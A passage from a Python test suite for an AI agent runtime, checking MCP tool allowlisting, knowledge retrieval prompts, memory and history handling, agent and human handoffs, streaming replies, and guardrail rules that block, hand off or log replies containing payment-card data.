                _make_fake_mcp_raw_tool("write_file", "Write a file"),
            ],
            call_result="file-content",
        )
        definition = AgentDefinitionSnapshot(
            agent_key="sales-assistant",
            version_number=3,
            display_name="Sales Assistant",
            system_prompt_template="Use MCP tools when needed.",
            model_binding_key="agent.sales",
            checksum="sha256:mcp",
            mcp_bindings=(
                McpBindingSnapshot(
                    server_name="filesystem",
                    tool_whitelist=("read_file",),
                    server_config_json={
                        "name": "filesystem",
                        "transport": "stdio",
                        "command": "npx",
                        "tool_name_prefix": "fs_",
                    },
                ),
            ),
        )
        runtime = AgentRuntime(
            settings=AgentSettings(enable_mcp=True),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({"sales-assistant": definition}),
            mcp_client_manager=McpClientManager(configs=[], client_factory=lambda _: fake_client),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-mcp-definition",
                user_message="Read the MCP file",
                trace_id="trace-mcp-definition",
                agent_key="sales-assistant",
                provider=ProviderId.OPENAI,
            )
        )

        assert result.reply_text == "Read complete."
        assert [event.tool_name for event in result.tool_events] == ["fs_read_file"]
        assert result.tool_events[0].source_type == "mcp"
        assert result.tool_events[0].source_ref == "filesystem"
        fake_client.call_tool.assert_awaited_once_with("read_file", {"path": "/tmp/demo.txt"})
        prompt = gateway.requests[0].prompt
        assert '"name": "fs_read_file"' in prompt
        assert '"description": "Read a file"' in prompt
        assert "fs_write_file" not in prompt

    async def test_run_turn_includes_preloaded_knowledge_chunks_in_prompt(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Orders ship within 24 hours after payment confirmation.","should_handoff":false}',
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(knowledge_provider=StubKnowledgeProvider()),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-prefetch-1",
                user_message="What is the shipping policy?",
                knowledge_chunks=[
                    KnowledgeChunk(
                        title="Shipping policy",
                        content="Orders ship within 24 hours after payment confirmation.",
                        source="kb://shipping",
                    )
                ],
                knowledge_lookup_status="hit",
            )
        )

        assert result.reply_text == "Orders ship within 24 hours after payment confirmation."
        prompt = gateway.requests[0].prompt
        assert "Retrieved knowledge below comes from the current knowledge base." in prompt
        assert "Orders ship within 24 hours after payment confirmation." in prompt

    async def test_run_turn_includes_knowledge_miss_instruction_when_lookup_missed(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"No matching knowledge was found.","should_handoff":false}',
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
        )

        await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-prefetch-2",
                user_message="What is the document code?",
                knowledge_lookup_status="miss",
            )
        )

        assert "A knowledge lookup was attempted for this turn but no matching knowledge was found." in gateway.requests[0].prompt

    async def test_run_turn_surfaces_gateway_failures_as_agent_errors(self):
        gateway = FakeGatewayService([RuntimeError("boom")])
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
        )

        with pytest.raises(AgentError):
            await runtime.run_turn(
                AgentTurnRequest(
                    session_id="session-3",
                    user_message="hello",
                )
            )

    async def test_run_turn_generates_trace_id_when_missing(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"hello","should_handoff":false}',
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-4",
                user_message="hello",
                trace_id=None,
            )
        )

        assert result.trace_id
        assert gateway.requests[0].trace_id == result.trace_id

    async def test_run_turn_trims_history_to_configured_limit(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"ok","should_handoff":false}',
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(max_history_messages=2),
            gateway=gateway,
            tool_registry=ToolRegistry(),
        )

        history = [
            AgentMessage(role=AgentRole.USER, content="m1"),
            AgentMessage(role=AgentRole.ASSISTANT, content="m2"),
            AgentMessage(role=AgentRole.USER, content="m3"),
        ]
        await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-5",
                user_message="m4",
                history=history,
            )
        )

        prompt = gateway.requests[0].prompt
        assert "m1" not in prompt
        assert "m2" in prompt
        assert "m3" in prompt

    async def test_run_turn_uses_context_manager_when_memory_enabled(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"ok","should_handoff":false}',
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(
                memory=MemorySettings(
                    enabled=True,
                    max_total_tokens=44,
                    reserve_for_response=0,
                    reserve_for_system=0,
                    min_recent_messages=1,
                    enable_summarization=False,
                )
            ),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            context_manager=ContextManager(
                ContextWindowConfig(
                    max_total_tokens=44,
                    reserve_for_response=0,
                    reserve_for_system=0,
                    min_recent_messages=1,
                    enable_summarization=False,
                ),
                token_counter=CharacterTokenCounter(),
            ),
        )

        await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-memory-1",
                user_message="m4",
                history=[
                    AgentMessage(role=AgentRole.USER, content="drop-me"),
                    mark_message_priority(
                        AgentMessage(role=AgentRole.ASSISTANT, content="pin"),
                        MessagePriority.PINNED,
                    ),
                    AgentMessage(role=AgentRole.USER, content="recent"),
                ],
            )
        )

        prompt = gateway.requests[0].prompt
        assert "drop-me" not in prompt
        assert "pin" in prompt
        assert "recent" in prompt

    async def test_run_turn_restores_history_from_session_store(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"first","should_handoff":false}',
                ),
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"second","should_handoff":false}',
                ),
            ]
        )
        settings = AgentSettings(
            memory=MemorySettings(
                enabled=True,
                persist_sessions=True,
                max_total_tokens=400,
                reserve_for_response=0,
                reserve_for_system=0,
                min_recent_messages=4,
                enable_summarization=False,
            )
        )
        runtime = AgentRuntime(
            settings=settings,
            gateway=gateway,
            tool_registry=ToolRegistry(),
            context_manager=ContextManager(
                ContextWindowConfig(
                    max_total_tokens=400,
                    reserve_for_response=0,
                    reserve_for_system=0,
                    min_recent_messages=4,
                    enable_summarization=False,
                ),
                token_counter=CharacterTokenCounter(),
            ),
            session_store=InMemorySessionStore(),
        )

        await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-memory-2",
                user_message="hello",
            )
        )
        await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-memory-2",
                user_message="follow up",
            )
        )

        assert "hello" in gateway.requests[1].prompt
        assert "first" in gateway.requests[1].prompt

    async def test_run_turn_maps_handoff_through_policy(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Escalating","should_handoff":true,"handoff_reason":"refund exception"}',
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="handoff"),
            gateway=gateway,
            tool_registry=ToolRegistry(handoff_policy=StubHandoffPolicy()),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-6",
                user_message="I need a manager",
            )
        )

        assert result.action == AgentAction.HANDOFF
        assert result.reply_text == "handoff"
        assert result.handoff_reason == "policy:refund exception"

    async def test_run_turn_global_guardrail_block_returns_blocked_reply(self):
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService(
                [
                    TextGenerateResponse(
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Please share your credit card number.","should_handoff":false}',
                    )
                ]
            ),
            tool_registry=ToolRegistry(),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="block-pci-output",
                            priority=10,
                            action="block",
                            reason="pci_detected",
                        ),
                    ),
                )
            ),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-global-block-1",
                user_message="What should I send?",
                trace_id="trace-global-block-1",
            )
        )

        assert result.action == AgentAction.REPLY
        assert result.reply_text == "I'm unable to process this request."
        assert result.raw_messages[-1].metadata["global_guardrail_action"] == "block"
        assert result.raw_messages[-1].metadata["global_guardrail_rule_key"] == "block-pci-output"

    async def test_run_turn_global_guardrail_handoff_uses_existing_handoff_fields(self):
        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="handoff"),
            gateway=FakeGatewayService(
                [
                    TextGenerateResponse(
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Please share your credit card number.","should_handoff":false}',
                    )
                ]
            ),
            tool_registry=ToolRegistry(),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="handoff-sensitive-output",
                            priority=10,
                            action="handoff",
                            reason="manual_review_required",
                        ),
                    ),
                )
            ),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-global-handoff-1",
                user_message="What should I send?",
                trace_id="trace-global-handoff-1",
            )
        )

        assert result.action == AgentAction.HANDOFF_HUMAN
        assert result.reply_text == "handoff"
        assert result.handoff_reason == "manual_review_required"
        assert result.handoff_target is not None
        assert result.handoff_target.target_type == "human"
        assert result.raw_messages[-1].metadata["global_guardrail_action"] == "handoff"

    async def test_run_turn_voice_global_guardrail_handoff_blocks_reply(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="请稍候，我为你转接人工。"),
            gateway=FakeGatewayService(
                [
                    TextGenerateResponse(
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"你的银行卡号是 1234。","should_handoff":false}',
                    )
                ]
            ),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        guardrails_policy={"voice_guardrails": {"mode": "observe_only", "revision": 7}},
                        voice_guardrails=VoiceGuardrailsSnapshot(
                            mode="observe_only",
                            revision=7,
                        ),
                    )
                }
            ),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="voice-sensitive-output",
                            priority=10,
                            action="handoff",
                            reason="manual_review_required",
                            hints=("银行卡号",),
                        ),
                    ),
                )
            ),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-global-handoff-1",
                user_message="继续",
                channel="voice",
                agent_key="sales-assistant",
            )
        )

        assert result.action == AgentAction.HANDOFF_HUMAN
        assert result.reply_text == "请稍候，我为你转接人工。"
        assert result.handoff_reason == "manual_review_required"
        assert result.raw_messages[-1].metadata["global_guardrail_action"] == "handoff"
        assert result.raw_messages[-1].metadata["global_guardrail_rule_key"] == "voice-sensitive-output"

    async def test_run_turn_global_guardrail_alert_records_audit_and_keeps_reply(self):
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService(
                [
                    TextGenerateResponse(
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Please share your credit card number.","should_handoff":false}',
                    )
                ]
            ),
            tool_registry=ToolRegistry(),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="alert-sensitive-output",
                            priority=10,
                            action="alert",
                            reason="audit_sensitive_output",
                        ),
                    ),
                )
            ),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-global-alert-1",
                user_message="What should I send?",
                trace_id="trace-global-alert-1",
            )
        )

        assert result.action == AgentAction.REPLY
        assert result.reply_text == "Please share your credit card number."
        assert result.raw_messages[-1].metadata["global_guardrail_action"] == "alert"
        assert result.raw_messages[-1].metadata["global_guardrail_rule_key"] == "alert-sensitive-output"
        assert runtime.recent_global_guardrail_samples(1)[0]["action"] == "alert"
        assert runtime.recent_global_guardrail_samples(1)[0]["rule_key"] == "alert-sensitive-output"

    async def test_run_turn_global_guardrail_matches_rubric_without_hints(self):
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService(
                [
                    TextGenerateResponse(
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Please share your credit card number.","should_handoff":false}',
                    )
                ]
            ),
            tool_registry=ToolRegistry(),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        GlobalGuardrailRule(
                            rule_key="semantic-pci-output",
                            title="semantic-pci-output",
                            description="Escalate when payment card data is requested or disclosed.",
                            enabled=True,
                            priority=10,
                            matcher=GlobalGuardrailMatcher(
                                type="llm_judge",
                                rubric="Detect PCI disclosures",
                                scope="output",
                                threshold=0.7,
                                hints=(),
                            ),
                            action="block",
                            action_config={"reason": "pci_detected"},
                            failure_mode="fail_closed",
                        ),
                    ),
                )
            ),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-global-semantic-1",
                user_message="What should I send?",
                trace_id="trace-global-semantic-1",
            )
        )

        assert result.reply_text == "I'm unable to process this request."
        assert result.raw_messages[-1].metadata["global_guardrail_rule_key"] == "semantic-pci-output"

    async def test_stream_turn_global_guardrail_input_block_short_circuits_before_gateway(self):
        gateway = FakeGatewayService([])
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="block-sensitive-input",
                            priority=10,
                            action="block",
                            scope="input",
                            hints=("credit card",),
                            reason="pci_detected",
                        ),
                    ),
                )
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-global-input-block-1",
                    user_message="My credit card is 4111",
                    trace_id="trace-stream-global-input-block-1",
                )
            )
        ]

        assert [event.event_type for event in events] == ["reply_completed"]
        assert events[0].reply_text == "I'm unable to process this request."
        assert events[0].raw_messages[0].metadata["global_guardrail_action"] == "block"
        assert events[0].raw_messages[0].metadata["global_guardrail_rule_key"] == "block-sensitive-input"
        assert gateway.stream_requests == []

    async def test_stream_turn_global_guardrail_output_handoff_uses_handoff_event(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Please share your credit card number.","should_handoff":false}',
                        usage=UsageInfo(input_tokens=4, output_tokens=3, total_tokens=7),
                    ),
                ]
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="handoff"),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="handoff-sensitive-output",
                            priority=10,
                            action="handoff",
                            reason="manual_review_required",
                        ),
                    ),
                )
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-global-handoff-1",
                    user_message="What should I send?",
                    trace_id="trace-stream-global-handoff-1",
                )
            )
        ]

        assert [event.event_type for event in events] == ["handoff"]
        assert events[0].reply_text == "handoff"
        assert events[0].handoff_reason == "manual_review_required"
        assert events[0].raw_messages[-1].metadata["global_guardrail_action"] == "handoff"
        assert events[0].raw_messages[-1].metadata["global_guardrail_rule_key"] == "handoff-sensitive-output"

    async def test_stream_turn_global_guardrail_output_block_suppresses_reply_deltas(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        delta='{"kind":"final","reply_text":"Please share your credit card number.',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Please share your credit card number.","should_handoff":false}',
                        usage=UsageInfo(input_tokens=4, output_tokens=3, total_tokens=7),
                    ),
                ]
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="block-sensitive-output",
                            priority=10,
                            action="block",
                            reason="manual_review_required",
                        ),
                    ),
                )
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-global-block-1",
                    user_message="What should I send?",
                    trace_id="trace-stream-global-block-1",
                )
            )
        ]

        assert [event.event_type for event in events] == ["reply_completed"]
        assert events[0].reply_text == "I'm unable to process this request."
        assert events[0].raw_messages[-1].metadata["global_guardrail_action"] == "block"
        assert events[0].raw_messages[-1].metadata["global_guardrail_rule_key"] == "block-sensitive-output"

    async def test_stream_turn_global_guardrail_alert_records_audit_and_keeps_reply(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Please share your credit card number.","should_handoff":false}',
                        usage=UsageInfo(input_tokens=4, output_tokens=3, total_tokens=7),
                    ),
                ]
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="alert-sensitive-output",
                            priority=10,
                            action="alert",
                            reason="audit_sensitive_output",
                        ),
                    ),
                )
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-global-alert-1",
                    user_message="What should I send?",
                    trace_id="trace-stream-global-alert-1",
                )
            )
        ]

        assert [event.event_type for event in events] == ["reply_delta", "reply_completed"]
        assert events[1].reply_text == "Please share your credit card number."
        assert events[1].raw_messages[-1].metadata["global_guardrail_action"] == "alert"
        assert events[1].raw_messages[-1].metadata["global_guardrail_rule_key"] == "alert-sensitive-output"
        assert runtime.recent_global_guardrail_samples(1)[0]["action"] == "alert"
        assert runtime.recent_global_guardrail_samples(1)[0]["rule_key"] == "alert-sensitive-output"

    async def test_run_turn_executes_agent_handoff_via_manager(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Routing","should_handoff":true,"handoff_reason":"refund","handoff_target_type":"agent","handoff_target_agent":"refund-specialist"}',
                )
            ]
        )
        sub_result = AgentTurnResult(
            session_id="session-sub-1",
            trace_id="trace-sub-1",
            action=AgentAction.REPLY,
            reply_text="Refund specialist reply",
            agent_key="refund-specialist",
            raw_messages=[AgentMessage(role=AgentRole.ASSISTANT, content="Refund specialist reply")],
        )
        runner = StubAgentHandoffRunner(sub_result)
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            handoff_manager=HandoffManager(runner),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-sub-1",
                user_message="Need refund help",
                agent_key="triage",
                trace_id="trace-sub-1",
            )
        )

        assert result.action == AgentAction.REPLY
        assert result.reply_text == "Refund specialist reply"
        assert result.responding_agent_key == "refund-specialist"
        assert result.orchestration_chain == ["triage", "refund-specialist"]
        assert len(runner.calls) == 1
        assert runner.calls[0].agent_key == "refund-specialist"

    async def test_run_turn_uses_definition_prompt_model_and_tool_allowlist(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="agent.sales",
                    text='{"kind":"final","reply_text":"definition reply","should_handoff":false}',
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(default_system_prompt="base prompt"),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {"sales-assistant": _sample_definition(tool_mode="manual_only")}
            ),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-definition-1",
                user_message="hello",
                agent_key="sales-assistant",
                agent_version=3,
                model="ignored-model",
                provider=ProviderId.OPENAI,
            )
        )

        assert result.reply_text == "definition reply"
        assert result.agent_key == "sales-assistant"
        assert result.agent_version == 3
        assert gateway.requests[0].model == "agent.sales"
        assert gateway.requests[0].provider is None
        assert "You are the sales definition prompt." in gateway.requests[0].prompt
        assert "knowledge_search" not in gateway.requests[0].prompt

    async def test_execute_tool_call_passes_definition_bindings_to_tool_registry(self):
        tool_registry = ToolRegistry()
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([]),
            tool_registry=tool_registry,
        )
        request = AgentTurnRequest(
            session_id="session-tool-binding-1",
            user_message="hello",
            trace_id="trace-tool-binding-1",
        )
        deps = AgentRunDeps(
            request=request,
            session_state=Mock(),
            trace_id=request.trace_id,
        )
        bindings = [ToolBinding(tool_name="knowledge_search")]

        invoke_tool = AsyncMock(return_value="tool output")
        with patch.object(ToolRegistry, "invoke_tool", invoke_tool):
            result = await runtime._execute_tool_call(
                request=request,
                settings=runtime.settings,
                deps=deps,
                tool_name="knowledge_search",
                arguments={"query": "shipping"},
                allowed_tool_names=frozenset({"knowledge_search"}),
                tool_bindings=bindings,
            )

        assert result == "tool output"
        invoke_tool.assert_awaited_once_with(
            tool_name="knowledge_search",
            arguments={"query": "shipping"},
            settings=runtime.settings,
            deps=deps,
            allowed_tool_names=frozenset({"knowledge_search"}),
            tool_bindings=bindings,
        )

    async def test_execute_tool_call_degrades_voice_tool_timeout_to_fallback_text(self):
        tool_registry = ToolRegistry()
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([]),
            tool_registry=tool_registry,
        )
        request = AgentTurnRequest(
            session_id="session-voice-timeout-1",
            user_message="广州明天的天气",
            trace_id="trace-voice-timeout-1",
            channel="acs_voice_realtime",
            metadata={"voice_input_source": "gateway_speech", "voice_tool_timeout_ms": "10"},
        )
        deps = AgentRunDeps(
            request=request,
            session_state=Mock(),
            trace_id=request.trace_id,
        )

        async def invoke_tool(*args, **kwargs):
            raise TimeoutError("weather lookup timed out")

        with patch.object(ToolRegistry, "invoke_tool", invoke_tool):
            result = await runtime._execute_tool_call(
                request=request,
                settings=runtime.settings,
                deps=deps,
                tool_name="weather_query",
                arguments={"city": "Guangzhou"},
                allowed_tool_names=frozenset({"weather_query"}),
                tool_bindings=None,
            )

        assert "Tool weather_query did not return usable data" in result
        assert "live lookup is temporarily unavailable" in result
        assert deps.tool_events[-1].tool_name == "weather_query"
        assert deps.tool_events[-1].status == "timeout"

    async def test_run_turn_applies_runtime_overrides_from_definition_and_request(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="agent.sales",
                    text='{"kind":"final","reply_text":"override reply","should_handoff":false}',
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(temperature=0.2, max_output_tokens=800),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        runtime_options={"temperature": 0.6},
                    )
                }
            ),
        )

        await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-definition-2",
                user_message="hello",
                agent_key="sales-assistant",
                agent_runtime_overrides={"max_output_tokens": "128"},
            )
        )

        assert gateway.requests[0].temperature == 0.6
        assert gateway.requests[0].max_output_tokens == 128

    async def test_stream_turn_emits_reply_deltas_and_completion(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        delta='{"kind":"final","reply_text":"Hel',
                    ),
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        delta='lo world","should_handoff":false}',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Hello world","should_handoff":false}',
                        usage=UsageInfo(input_tokens=4, output_tokens=3, total_tokens=7),
                    ),
                ]
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-1",
                    user_message="hello",
                    trace_id="trace-stream-1",
                )
            )
        ]

        assert [event.event_type for event in events] == [
            "reply_delta",
            "reply_delta",
            "reply_completed",
        ]
        assert events[0].delta == "Hel"
        assert events[1].delta == "lo world"
        assert events[2].reply_text == "Hello world"
        assert events[2].usage.total_tokens == 7
        assert events[2].raw_messages[0].role == AgentRole.USER
        assert events[2].raw_messages[1].content == "Hello world"

    async def test_stream_turn_executes_tool_call_then_streams_final_reply(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"tool_call","tool_name":"knowledge_search","arguments":{"query":"shipping policy","top_k":1},"reply_text":"Let me check that for you."}',
                        usage=UsageInfo(input_tokens=10, output_tokens=5, total_tokens=15),
                    ),
                ],
                [
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        delta='{"kind":"final","reply_text":"Orders ',
                    ),
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        delta='ship fast","should_handoff":false}',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Orders ship fast","should_handoff":false}',
                        usage=UsageInfo(input_tokens=6, output_tokens=4, total_tokens=10),
                    ),
                ],
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(knowledge_provider=StubKnowledgeProvider()),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-2",
                    user_message="shipping?",
                    trace_id="trace-stream-2",
                )
            )
        ]

        assert events[0].event_type == "tool_call"
        assert events[0].tool_name == "knowledge_search"
        assert events[0].reply_text == "Let me check that for you."
        assert events[1].event_type == "tool_result"
        assert events[1].tool_event is not None
        assert events[1].tool_event.status == "success"
        assert events[2].delta == "Orders "
        assert events[3].delta == "ship fast"
        assert events[4].event_type == "reply_completed"
        assert events[4].usage.total_tokens == 25
        assert len(gateway.stream_requests) == 2

    async def test_stream_turn_executes_weather_query_tool_for_voice_delegation(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text=(
                            '{"kind":"tool_call","tool_name":"weather_query",'
                            '"arguments":{"city":"Guangzhou","days":1}}'
                        ),
                        usage=UsageInfo(input_tokens=11, output_tokens=4, total_tokens=15),
                    ),
                ],
                [
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        delta='{"kind":"final","reply_text":"Guangzhou tomorrow: light rain.",',
                    ),
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        delta='"should_handoff":false}',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text=(
                            '{"kind":"final","reply_text":"Guangzhou tomorrow: light rain.",'
                            '"should_handoff":false}'
                        ),
                        usage=UsageInfo(input_tokens=8, output_tokens=5, total_tokens=13),
                    ),
                ],
            ]
        )
        weather_tool = StubWeatherTool()
        registry = ToolRegistry()
        registry.register(
            ToolSpec(
                name="weather_query",
                description="Look up weather forecasts by city.",
                parameters_schema={
                    "type": "object",
                    "properties": {
                        "city": {"type": "string"},
                        "days": {"type": "integer"},
                    },
                    "required": ["city"],
                },
                tags=frozenset({"external", "weather", "read_only"}),
            ),
            weather_tool,
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=registry,
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-weather-voice-delegated",
                    user_message="广州明天的天气",
                    trace_id="trace-weather-voice-delegated",
                    agent_key="call-center-en-us",
                    channel="acs_voice_realtime",
